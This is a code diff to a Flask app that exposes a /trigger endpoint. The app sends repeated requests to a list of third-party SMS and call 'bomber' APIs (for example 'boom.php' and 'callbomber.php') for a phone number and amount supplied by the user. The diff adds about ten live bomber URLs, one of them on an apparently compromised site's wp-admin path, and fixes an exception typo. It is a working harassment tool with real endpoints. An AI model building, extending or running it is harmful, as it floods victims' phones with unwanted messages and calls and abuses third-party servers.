@@ -7,12 +7,20 @@ from threading import Thread, Event
 app = Flask(__name__)
 CORS(app)  # Enable CORS
 
-API_ENDPOINTS = [
+API_ENDPOINTS =  [
     "https://rnf.nsmodz.top/api.php?phone=",
     "http://168.119.39.20/~rnfmodsc/api/69.php?phone=",
-    # Add other endpoints here
+    "http://107.150.56.100/~bct26/boom.php?phone=",
+    "https://ultranetrn.com.br/fonts/api.php?number=",
+    "http://api.task10.top/indexapi.php?phone=",
+    "https://rnf.nsmodz.top/aapi.php?phone=",
+    "http://yousuf323215.serv00.net/api/sms1.php?number=",
+    "http://82.112.236.31/callbomber.php?phone=",
+    "https://rafixt.my.id/bot/100api.php?phone=",
+    "https://abinfotechnologies.com/wp-admin/api/pikachu-call.php?phone=",
+    "http://168.119.39.20/~rnfmodsc/call/api.php?key=rafiz&num=",
+    "https://serversheba.my.id/bomber/Api.php?num="
 ]
-
 stop_event = Event()
 
 @app.route('/trigger', methods=['POST'])
@@ -51,7 +59,7 @@ def send_requests(phone_number, amount):
                     print(f"Success from {api}")
                 else:
                     print(f"Failed from {api}")
-            except Exception ase:
+            except Exception as e:
                 print(f"Error contacting {api}: {e}")
         time.sleep(1)
 
